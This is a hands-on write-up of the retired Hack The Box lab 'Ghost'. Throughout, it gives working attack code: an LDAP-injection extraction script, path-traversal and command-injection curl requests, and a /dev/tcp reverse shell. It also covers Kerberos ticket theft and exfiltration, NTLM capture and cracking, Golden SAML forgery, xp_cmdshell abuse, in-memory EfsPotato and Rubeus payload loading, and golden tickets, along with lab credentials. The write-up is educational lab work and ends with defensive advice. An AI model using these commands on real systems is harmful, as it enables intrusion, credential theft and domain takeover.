---
title: "Hack The Box — Ghost"
summary: "A hands-on Ghost lab journal: LDAP injection, Gitea source review, Linux and Kerberos pivots, Golden SAML, linked MSSQL, in-memory privilege escalation and forest compromise."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Insane"
os: "Windows"
solvedAt: 2026-08-29
publishedAt: 2026-08-31
tags:
  - active-directory
  - ldap-injection
  - path-traversal
  - command-injection
  - kerberos
  - gmsa
  - golden-saml
  - linked-mssql
  - domain-trust
  - golden-ticket
tools:
  - Nmap
  - Burp Suite
  - curl
  - Python
  - Git
  - ripgrep
  - NetExec
  - Responder
  - Hashcat
  - nsupdate
  - Impacket
  - Evil-WinRM
  - ADFSDump
  - ADFSpoof
  - EfsPotato
  - Rubeus
cves: []
htbUrl: "https://app.hackthebox.com/machines/Ghost"
cover: "/images/writeups/hackthebox/machines/ghost/ghost.png"
coverAlt: "Hack The Box Ghost machine artwork showing the Ghost mascot emerging from a laptop"
featured: true
draft: false
---

> **Authorized-lab notice:** This write-up documents a retired Hack The Box target. The commands and credentials belong only to that isolated lab. User and root flag values are intentionally omitted.

## About this write-up

This is a reconstruction of my actual solve on 29 August 2026, not a cleaned-up copy of the official walkthrough. The primary source is my Codex session: the commands I ran, the outputs I received, the mistakes I made and the delivery problems that changed the next step.

There is one important exception. After compromising `adfs_gmsa$`, I consulted the official HTB write-up because the remaining ADFS and cross-domain chain was taking too long. At the final trust-abuse step, I used the `krbtgt` AES key and domain SID information from the official material instead of independently obtaining them with PowerView and DCSync. I mark that boundary explicitly and show the missing derivation so the path remains reproducible.

## Machine information

Ghost begins with LDAP injection and expands into a small enterprise environment: two web applications, Gitea, a Linux container, a domain-joined Linux workstation, ADFS, linked MSSQL servers and two trusted AD domains.

| Item | Value from my session |
| --- | --- |
| Target | `10.129.51.84` |
| VPN address | `10.10.15.201` |
| Primary domain | `ghost.htb` |
| Trusted domain | `corp.ghost.htb` |
| Domain controller | `DC01.ghost.htb` |
| Linked SQL host | `PRIMARY.corp.ghost.htb` |

The IP addresses are session-specific. Replace them if HTB assigns different addresses.

## Attack path

| Stage | Result |
| --- | --- |
| LDAP injection | Extracted the `gitea_temp_principal` secret |
| Gitea review | Found file-read and command-injection source |
| Linux foothold | Root shell inside the intranet container |
| SSH multiplexing | Stole Florence's Kerberos TGT from `LINUX-DEV-WS01` |
| AD DNS update | Captured Justin's NetNTLMv2 response |
| gMSA read | Compromised `adfs_gmsa$` and gained WinRM access |
| Golden SAML | Reached the administrator-only database panel |
| Linked MSSQL | Executed commands on `PRIMARY` as the SQL service |
| EfsPotato | Became `NT AUTHORITY\SYSTEM` |
| Golden Ticket | Crossed the forest trust and reached the final flag |

## 1. Initial enumeration

I started with a full TCP scan:

```bash
nmap 10.129.51.84 -T5 -sVC -p-
```

The useful results were:

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Active Directory LDAP (ghost.htb)
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
8008/tcp  open  http          nginx / Ghost 5.78
8443/tcp  open  ssl/http      nginx / Ghost Core
49443/tcp open  unknown
```

The certificates disclosed `DC01.ghost.htb` and `core.ghost.htb`:

```bash
echo '10.129.51.84 ghost.htb dc01.ghost.htb core.ghost.htb' \
  | sudo tee -a /etc/hosts
```

### Early false lead

I initially inspected `https://core.ghost.htb:8443/`. Burp showed a normal ADFS form with `UserName`, `Password` and `FormsAuthentication`; this was not the LDAP injection point.

I returned to the Ghost CMS on port `8008`, downloaded its sitemaps and enumerated virtual hosts. This exposed:

```text
intranet.ghost.htb
gitea.ghost.htb
```

```bash
echo '10.129.51.84 intranet.ghost.htb gitea.ghost.htb' \
  | sudo tee -a /etc/hosts
```

`http://intranet.ghost.htb:8008/` redirected to `/login`. The form used `ldap-username` and `ldap-secret`, matching the expected attack surface.

## 2. LDAP wildcard injection

The login was a Next.js server action. I intercepted a normal request and changed only the values of these multipart fields:

```text
1_ldap-username = *
1_ldap-secret   = *
```

My first manual attempt was wrong: I accidentally changed the parameter names to strings such as `1_ldap-username = *` while leaving the values as `test`. Once corrected, the wildcard pair returned:

```text
HTTP/1.1 303 See Other
Set-Cookie: token=Bearer%20...
x-action-redirect: /
```

That proved the LDAP filter accepted an unescaped wildcard. The wildcard session matched `kathryn.holland`, and the dashboard disclosed the temporary Gitea account `gitea_temp_principal`.

### Prefix-oracle extraction

The action ID and action key were dynamic, so my extractor first downloaded the login page and parsed the current values. It then tested prefixes such as `s*`, `sz*` and `szr*`, treating a redirect or session cookie as true.

```python
#!/usr/bin/env python3
import html, json, re, string, sys, time
import requests

BASE = "http://intranet.ghost.htb:8008"
USERNAME = "gitea_temp_principal"

page = requests.get(f"{BASE}/login", timeout=10)
page.raise_for_status()
decoded = html.unescape(page.text)
action_id = re.search(r'"id":"([a-f0-9]+)"', decoded).group(1)
action_key = re.search(
    r'name="\$ACTION_KEY" value="([^"]+)"', page.text
).group(1)

headers = {
    "Next-Action": action_id,
    "Accept": "text/x-component",
    "Origin": BASE,
    "Referer": f"{BASE}/login",
}

def ldap_escape(value):
    table = {"\\": r"\5c", "*": r"\2a", "(": r"\28", ")": r"\29"}
    return "".join(table.get(char, char) for char in value)

def oracle(secret_filter):
    fields = [
        ("1_$ACTION_REF_1", (None, "")),
        ("1_$ACTION_1:0", (None, json.dumps(
            {"id": action_id, "bound": "$@1"}, separators=(",", ":")
        ))),
        ("1_$ACTION_1:1", (None, "[{}]")),
        ("1_$ACTION_KEY", (None, action_key)),
        ("1_ldap-username", (None, USERNAME)),
        ("1_ldap-secret", (None, secret_filter)),
        ("0", (None, '[{},"$K1"]')),
    ]
    for attempt in range(3):
        try:
            response = requests.post(
                f"{BASE}/login", headers=headers, files=fields,
                allow_redirects=False, timeout=15
            )
            return response.status_code == 303 or "token=" in response.headers.get(
                "Set-Cookie", ""
            )
        except requests.RequestException:
            if attempt == 2:
                raise
            time.sleep(1)

alphabet = string.ascii_lowercase + string.digits + string.ascii_uppercase
recovered = ""

for position in range(1, 129):
    for character in alphabet:
        candidate = recovered + character
        if oracle(ldap_escape(candidate) + "*"):
            recovered = candidate
            print(f"[+] {position:03d}: {recovered!r}", flush=True)
            break
    else:
        sys.exit(f"[-] No match after {recovered!r}")

    if oracle(ldap_escape(recovered)):
        print(f"[+] Complete secret: {recovered}")
        break
```

The live run completed after 16 positions:

```text
[+] 001: 's'
[+] 008: 'szrr8kpc'
[+] 016: 'szrr8kpc3z6onlqf'
[+] Complete secret: szrr8kpc3z6onlqf
```

I logged into Gitea as:

```text
gitea_temp_principal : szrr8kpc3z6onlqf
```

## 3. Source review to Linux RCE

The account could access `ghost-dev/blog` and `ghost-dev/intranet`:

```bash
mkdir -p ~/Documents/HackTheBox/Ghost/repos
cd ~/Documents/HackTheBox/Ghost/repos
git clone http://gitea.ghost.htb:8008/ghost-dev/blog.git
git clone http://gitea.ghost.htb:8008/ghost-dev/intranet.git

rg -n -i 'readFile|readFileSync|createReadStream|path\.join|fs\.' blog intranet
rg -n -i 'Command::new|exec\(|spawn\(|bash|/bin/sh' blog intranet
```

### Arbitrary file read

`blog/posts-public.js` appended a user-controlled `extra` value:

```javascript
const extra = frame.original.query?.extra;
if (extra) {
    const fs = require("fs");
    if (fs.existsSync(extra)) {
        const fileContent = fs.readFileSync(
            "/var/lib/ghost/extra/" + extra,
            {encoding: "utf8"}
        );
        posts.meta.extra = {[extra]: fileContent};
    }
}
```

Using the live public Content API key, four traversal components escaped the intended directory:

```bash
CONTENT_KEY='37395e9e872be56438c83aaca6'

curl -sG 'http://ghost.htb:8008/ghost/api/content/posts/' \
  --data-urlencode "key=$CONTENT_KEY" \
  --data-urlencode 'limit=1' \
  --data-urlencode 'extra=../../../../etc/passwd' \
  | jq -r '.meta.extra[]'
```

The output contained Alpine-style users such as `root:/bin/ash` and `node:/bin/sh`. I then read the Ghost process environment:

```bash
curl -sG 'http://ghost.htb:8008/ghost/api/content/posts/' \
  --data-urlencode "key=$CONTENT_KEY" \
  --data-urlencode 'limit=2' \
  --data-urlencode 'extra=../../../../proc/self/environ'
```

The important value was:

```text
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
```

My `tee recon/...` commands failed here because I was inside `repos/`, which had no `recon/` directory. The exploit worked; only the local save path was wrong.

### Command injection

`intranet/backend/src/api/dev/scan.rs` constructed:

```rust
Command::new("bash")
    .arg("-c")
    .arg(format!("intranet_url_check {}", data.url))
    .output();
```

The leaked key authorized the route, while `;` escaped the intended command:

```bash
DEV_KEY='!@yqr!X2kxmQ.@Xe'

curl -si -X POST \
  'http://intranet.ghost.htb:8008/api-dev/scan' \
  -H "X-DEV-INTRANET-KEY: $DEV_KEY" \
  -H 'Content-Type: application/json' \
  --data '{"url":"test; id; hostname; pwd"}'
```

```text
uid=0(root) gid=0(root) groups=0(root)
36b733906694
/app
bash: intranet_url_check: command not found
```

I encoded a Bash callback to avoid JSON quoting problems:

```bash
SHELL_B64=$(printf '%s' \
  'bash -i >& /dev/tcp/10.10.15.201/4444 0>&1' | base64 -w0)

curl -s -X POST \
  'http://intranet.ghost.htb:8008/api-dev/scan' \
  -H "X-DEV-INTRANET-KEY: $DEV_KEY" \
  -H 'Content-Type: application/json' \
  --data "{\"url\":\"test; echo $SHELL_B64 | base64 -d | bash\"}"
```

The listener returned root inside `/app`, but it was container root rather than root on the Linux host.

## 4. SSH ControlMaster to Kerberos

There was no Docker socket or obvious host mount. The decisive result from `ps auxww` was:

```text
ssh: /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 [mux]
```

I reused the active socket without knowing Florence's password:

```bash
SOCK=$(find /root/.ssh/controlmaster -type s -print -quit)

ssh -S "$SOCK" -O check \
  -l 'florence.ramirez@ghost.htb' dev-workstation

ssh -S "$SOCK" -o ControlMaster=no \
  -l 'florence.ramirez@ghost.htb' dev-workstation \
  'id; hostname; echo "KRB5CCNAME=$KRB5CCNAME"; klist -A'
```

```text
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
LINUX-DEV-WS01
KRB5CCNAME=FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB
```

I copied the ccache into the container and sent it to Kali:

```bash
# Kali
nc -lvnp 5555 > florence.ccache

# Container
ssh -S "$SOCK" -o ControlMaster=no \
  -l 'florence.ramirez@ghost.htb' dev-workstation \
  'cat /tmp/krb5cc_50' > /tmp/florence.ccache
bash -c 'cat /tmp/florence.ccache > /dev/tcp/10.10.15.201/5555'
```

```bash
chmod 600 florence.ccache
export KRB5CCNAME="$HOME/Documents/HackTheBox/Ghost/florence.ccache"
klist
netexec smb dc01.ghost.htb --use-kcache
netexec ldap dc01.ghost.htb --use-kcache
```

Both services authenticated as `GHOST.HTB\florence.ramirez from ccache`.

## 5. DNS abuse and Justin's credentials

An intranet forum message said Justin had a process repeatedly reaching the nonexistent `bitbucket.ghost.htb`. I attempted to add it with `nsupdate -g`, but the first run failed:

```text
Cannot find KDC for realm "GHOST.HTB"
```

The ccache was valid; the local Kerberos libraries did not know the KDC. I created:

```ini
# recon/krb5-ghost.conf
[libdefaults]
    default_realm = GHOST.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    GHOST.HTB = {
        kdc = dc01.ghost.htb
        admin_server = dc01.ghost.htb
    }

[domain_realm]
    .ghost.htb = GHOST.HTB
    ghost.htb = GHOST.HTB
```

```bash
export KRB5_CONFIG="$HOME/Documents/HackTheBox/Ghost/recon/krb5-ghost.conf"
export KRB5CCNAME="$HOME/Documents/HackTheBox/Ghost/florence.ccache"
kvno DNS/dc01.ghost.htb
sudo responder -I tun0 -v
```

With Responder running, I repeated the update:

```text
$ nsupdate -g -d
> server dc01.ghost.htb
> zone ghost.htb
> update add bitbucket.ghost.htb. 60 A 10.10.15.201
> send
> quit
```

The update returned `NOERROR`. Responder soon captured:

```text
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:...
```

My first Hashcat run failed with `Separator unmatched` because the saved line still included the Responder timestamp and label. I cleaned it first:

```bash
sed -E 's/^.*NTLMv2 Hash[[:space:]]*:[[:space:]]*//' \
  justin.hash | tr -d '\r' > justin.clean.hash

hashcat -m 5600 -a 0 justin.clean.hash \
  /usr/share/wordlists/rockyou.txt
hashcat -m 5600 justin.clean.hash --show
```

```text
GHOST\justin.bradley : Qwertyuiop1234$$
```

Because `$$` expands to a process ID in Bash, I used single quotes:

```bash
JUSTIN_PASS='Qwertyuiop1234$$'
netexec smb dc01.ghost.htb -u justin.bradley -p "$JUSTIN_PASS"
```

## 6. gMSA compromise

LDAP enumeration found one managed service account:

```bash
ldapsearch -x -H ldap://dc01.ghost.htb \
  -D 'justin.bradley@ghost.htb' -w "$JUSTIN_PASS" \
  -b 'DC=ghost,DC=htb' \
  '(objectClass=msDS-GroupManagedServiceAccount)' \
  sAMAccountName dNSHostName servicePrincipalName
```

```text
sAMAccountName: adfs_gmsa$
dNSHostName: federation.ghost.htb
servicePrincipalName: host/federation.ghost.htb
```

NetExec showed that Justin could read the managed password:

```bash
netexec ldap dc01.ghost.htb \
  -u justin.bradley -p "$JUSTIN_PASS" --gmsa
```

```text
Account: adfs_gmsa$
NTLM: 55eea5db159b96bcb1d335d6e5738ea6
PrincipalsAllowedToReadPassword: ['DC01$', 'justin.bradley']
```

The hash worked for WinRM:

```bash
netexec winrm dc01.ghost.htb \
  -u 'adfs_gmsa$' -H '55eea5db159b96bcb1d335d6e5738ea6'
```

```text
WINRM ... ghost.htb\adfs_gmsa$ ... (Pwn3d!)
```

Inside Evil-WinRM, `adfs_gmsa$` was only a member of `Remote Management Users`, not Administrators. `Get-Service adfssrv` found no local service, CIM returned `Access denied`, and direct MSSQL access landed as `guest`. At this point I consulted the official write-up.

## 7. ADFSDump and Golden SAML

I compiled ADFSDump on Kali:

```bash
cd ~/Documents/HackTheBox/Ghost
git clone https://github.com/mandiant/ADFSDump.git
cd ADFSDump
TERM=dumb xbuild ADFSDump.sln /p:Configuration=Release
```

The binary was created under `ADFSDump/ADFSDump/bin/Release/`.

### The actual upload problems

My first upload referenced the wrong local path. Supplying a full remote destination then caused Evil-WinRM to create a malformed path below the current directory. Finally, `C:\Users\Public` was not accessible to this account. The working method was:

```powershell
Set-Location -LiteralPath 'C:\Users\adfs_gmsa$\Documents'
```

```text
upload /home/kali/Documents/HackTheBox/Ghost/ADFSDump/ADFSDump/bin/Release/ADFSDump.exe
upload /home/kali/Documents/HackTheBox/Ghost/ADFSDump/ADFSDump/bin/Release/ADFSDump.exe.config
```

```powershell
.\ADFSDump.exe | Tee-Object .\adfsdump.txt
```

ADFSDump returned two DKM private-key candidates, the encrypted token-signing key, issuer information, the relying-party identifier, the ACS endpoint and the claims rules for `core.ghost.htb`.

The downloaded output was UTF-16LE. My first `awk` extraction therefore created a zero-byte file. Converting it fixed the problem:

```bash
iconv -f UTF-16LE -t UTF-8 adfsdump.txt > adfsdump-utf8.txt

awk '
/Encrypted Token Signing Key Begin/ {capture=1; next}
/Encrypted Token Signing Key End/   {capture=0}
capture
' adfsdump-utf8.txt \
  | tr -d '[:space:]' | base64 -d > TKSKey.bin
```

The sanity checks were:

```text
DKMkey.bin: 32 bytes
TKSKey.bin: 4371 bytes
```

I generated a SAML response for the administrator identity:

```bash
git clone https://github.com/mandiant/ADFSpoof.git
cd ADFSpoof
python3 -m venv .venv
source .venv/bin/activate
pip install cryptography==37.0.4 lxml pyasn1 signxml six

python3 ADFSpoof.py \
  -b ../TKSKey.bin ../DKMkey.bin \
  -s 'core.ghost.htb' -o golden-saml.txt saml2 \
  --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' \
  --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' \
  --nameid 'Administrator@ghost.htb' \
  --rpidentifier 'https://core.ghost.htb:8443' \
  --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
```

ADFSpoof wrote raw XML, so I encoded it for the HTTP form:

```bash
base64 -w0 golden-saml.txt > golden-saml.b64
python3 -c '
import urllib.parse
data=open("golden-saml.b64").read().strip()
print(urllib.parse.quote(data, safe=""))
' > golden-saml-urlencoded.txt
```

In Burp, the first request was the credential POST to `federation.ghost.htb`; I forwarded that unchanged. The request to modify was:

```http
POST /adfs/saml/postResponse HTTP/1.1
Host: core.ghost.htb:8443
```

Replacing only `SAMLResponse` with the forged value opened the administrator-only Ghost Config Panel.

## 8. Linked MSSQL and user access

The panel exposed a linked server called `PRIMARY`:

```sql
EXEC sp_linkedservers;
SELECT result FROM OPENQUERY("PRIMARY", 'SELECT SUSER_NAME() AS result');
```

The linked login could impersonate `sa`:

```sql
SELECT result FROM OPENQUERY(
  "PRIMARY",
  'SELECT DISTINCT b.name AS result
   FROM sys.server_permissions a
   INNER JOIN sys.server_principals b
     ON a.grantor_principal_id = b.principal_id
   WHERE a.permission_name = ''IMPERSONATE'';'
);
```

I enabled `xp_cmdshell` and confirmed execution:

```sql
EXEC (
  'EXECUTE AS LOGIN = ''sa'';
   EXEC sp_configure ''show advanced options'', 1;
   RECONFIGURE;
   EXEC sp_configure ''xp_cmdshell'', 1;
   RECONFIGURE;'
) AT "PRIMARY";

EXEC (
  'EXECUTE AS LOGIN = ''sa'';
   EXEC xp_cmdshell ''whoami & hostname'';'
) AT "PRIMARY";
```

```text
nt service\mssqlserver
PRIMARY
```

Through `xp_cmdshell` I could read `C:\Users\justin.bradley\Desktop\user.txt`. The flag value is omitted.

### Why Netcat did not survive

I served Kali's `nc.exe` over HTTP. The HTTP server logged `GET /nc.exe 200`, but `dir C:\Windows\Temp\nc.exe` immediately returned `File Not Found`, consistent with Defender quarantining it.

I switched to an encoded PowerShell TCP client executed through `xp_cmdshell`. The callback worked, but it passed every received chunk to `cmd.exe /c`. Therefore `pwd` and `ls` failed, and `cd` did not persist between commands. I had to use CMD syntax and absolute paths.

The token contained:

```text
nt service\mssqlserver
PRIMARY
SeImpersonatePrivilege  Enabled
```

## 9. EfsPotato and staged in-memory delivery

Downloading `EfsPotato.cs` to `C:\Windows\Temp` appeared successful, but the source disappeared. I compiled it on Kali. The first `mcs` run failed with a Mono terminfo exception; `TERM=dumb` fixed it:

```bash
cd ~/Documents/HackTheBox/Ghost/EfsPotato
TERM=dumb mcs \
  -sdk:4.5 -platform:anycpu -nowarn:1691,618 \
  -out:../EfsPotato.exe EfsPotato.cs
```

Instead of writing the executable to the target, I loaded it from bytes:

```powershell
$bytes=(New-Object Net.WebClient).DownloadData(
  'http://10.10.15.201:8000/EfsPotato.exe'
)
$asm=[Reflection.Assembly]::Load($bytes)
$cmd='cmd.exe /c whoami > C:\Windows\Temp\system.txt'
$null=$asm.EntryPoint.Invoke($null,(,[string[]]@($cmd,'lsarpc')))
```

EfsPotato reported `Get Token` and `process created`. The MSSQL shell could not read `system.txt` because of its ACL, so I moved to a SYSTEM callback.

The first callback command was 4,330 characters. The simple TCP shell split the paste into separate chunks; PowerShell received incomplete Base64 and the remaining text was interpreted as another command. The fix was a short bootstrap:

```powershell
$x=(New-Object Net.WebClient).DownloadString(
  'http://10.10.15.201:8000/run-system.txt'
).Trim()
& $env:ComSpec /d /c $x
```

`run-system.txt` contained the long in-memory EfsPotato loader and the encoded callback for port `9002`. This time the listener returned:

```text
nt authority\system
PRIMARY
```

This was the most realistic troubleshooting point in the solve: the exploit was correct, but delivery failed because of Defender, command length and TCP chunking.

## 10. Cross-domain Golden Ticket

### Honesty boundary: source-assisted values

I did not independently execute the trust-enumeration and DCSync phase. The complete derivation should be:

```powershell
IEX (IWR 'http://10.10.15.201:8000/PowerView.ps1' -UseBasicParsing)
Get-DomainTrust
Get-DomainSID ghost.htb
Get-DomainSID corp.ghost.htb

.\mimikatz.exe \
  'lsadump::dcsync /user:krbtgt@corp.ghost.htb' \
  'exit'
```

This produces the CORP domain SID, the GHOST domain SID and the AES-256 key for `krbtgt@corp.ghost.htb`. The final ticket is a CORP administrator TGT with `<GHOST_DOMAIN_SID>-519` in `ExtraSIDs`; RID `519` represents Enterprise Admins in the forest root domain.

In my actual run, I used those SID/AES values from the official write-up and moved directly to Rubeus.

### Building and loading Rubeus

The current Rubeus source did not compile cleanly with Mono `xbuild`. The first failure was C# language version; `LangVersion=latest` then exposed additional `mcs` incompatibilities. I eventually used Microsoft's Roslyn compiler package and produced a 463 KB `Rubeus.exe`.

I loaded that assembly in memory as SYSTEM:

```powershell
$bytes=(New-Object Net.WebClient).DownloadData(
  'http://10.10.15.201:8000/Rubeus.exe'
)
$asm=[Reflection.Assembly]::Load($bytes)
$args=[string[]]@(
  'golden',
  '/aes256:<CORP_KRBTGT_AES256>',
  '/ldap',
  '/user:Administrator',
  '/sids:<GHOST_DOMAIN_SID>-519',
  '/ptt'
)
$null=$asm.EntryPoint.Invoke($null,(,$args))
```

To prevent another long-paste failure, a small bootstrap downloaded the full Rubeus loader text. The HTTP server logged both `GET /rubeus-golden.txt` and `GET /Rubeus.exe`. Rubeus returned:

```text
[*] Action: Build TGT
[+] Ticket successfully imported!
```

`klist` showed `Administrator @ CORP.GHOST.HTB` in the SYSTEM logon session `0x3e7`. The Extra SID allowed access across the trust:

```cmd
klist
dir \\dc01.ghost.htb\c$\Users\Administrator\Desktop
type \\dc01.ghost.htb\c$\Users\Administrator\Desktop\root.txt
```

The listing showed `root.txt` with a size of 34 bytes. The final flag is omitted.

## What was verified versus source-assisted

| Step | Status in my solve |
| --- | --- |
| LDAP bypass and 16-character extraction | Executed and verified |
| Gitea access and source review | Executed and verified |
| File read, environment leak and command injection | Executed and verified |
| Linux root shell and SSH ControlMaster reuse | Executed and verified |
| Kerberos ccache transfer and AD authentication | Executed and verified |
| DNS update, Responder capture and Hashcat recovery | Executed and verified |
| gMSA read and WinRM access | Executed and verified |
| ADFSDump, ADFSpoof and Golden SAML | Executed after consulting official guidance |
| Linked SQL, user flag access and MSSQL shell | Executed and verified |
| In-memory EfsPotato and SYSTEM callback | Executed and verified |
| PowerView trust enumeration and Mimikatz DCSync | Not executed; official values used |
| In-memory Rubeus and root path access | Executed with source-assisted values |

## Lessons learned

- Preserve the evidence that justified every pivot: the `303`, container hostname, SSH mux process, Kerberos principal, DNS `NOERROR`, `Pwn3d!`, SQL identity and imported ticket were more useful than a bare command list.
- Source access beat broad fuzzing. Two `rg` searches exposed the file read and command injection.
- A Kerberos tool failure does not always mean the ticket is invalid; `nsupdate` failed because local realm discovery was incomplete.
- Responder output needed cleaning before Hashcat could parse it.
- Delivery was part of the attack. Defender removed recognizable files, Evil-WinRM path semantics caused misleading errors, and TCP chunking broke a long encoded command.
- Loading .NET assemblies from bytes avoided writing EfsPotato and Rubeus to disk, but EDR could still detect PowerShell, assembly loading, token impersonation and Kerberos cache activity.
- The final result was forest compromise, not merely local SYSTEM. The bidirectional trust amplified control of `PRIMARY` into access to `DC01`.

## Defensive takeaways

| Weakness | Defensive action |
| --- | --- |
| LDAP wildcard injection | Escape RFC 4515 metacharacters and use safe query builders |
| Reused secrets | Separate directory and source-control credentials; rotate leaked values |
| Arbitrary file read | Canonicalize paths and enforce an allow-listed base directory |
| Command injection | Avoid `bash -c`; pass fixed arguments to the child-process API |
| SSH ControlMaster reuse | Limit persistence and protect multiplexing sockets as credentials |
| AD DNS abuse | Restrict record creation and alert on records pointing to VPN/external ranges |
| NTLM capture | Reduce NTLM and monitor authentication to unexpected destinations |
| gMSA exposure | Audit principals allowed to retrieve managed passwords |
| ADFS key compromise | Isolate ADFS identities and rotate compromised signing certificates |
| Linked MSSQL abuse | Remove unnecessary links/impersonation grants and monitor `xp_cmdshell` |
| Token impersonation | Minimize service privileges and detect named-pipe impersonation |
| Trust abuse | Protect replication rights, monitor DCSync and review SID filtering/trust scope |
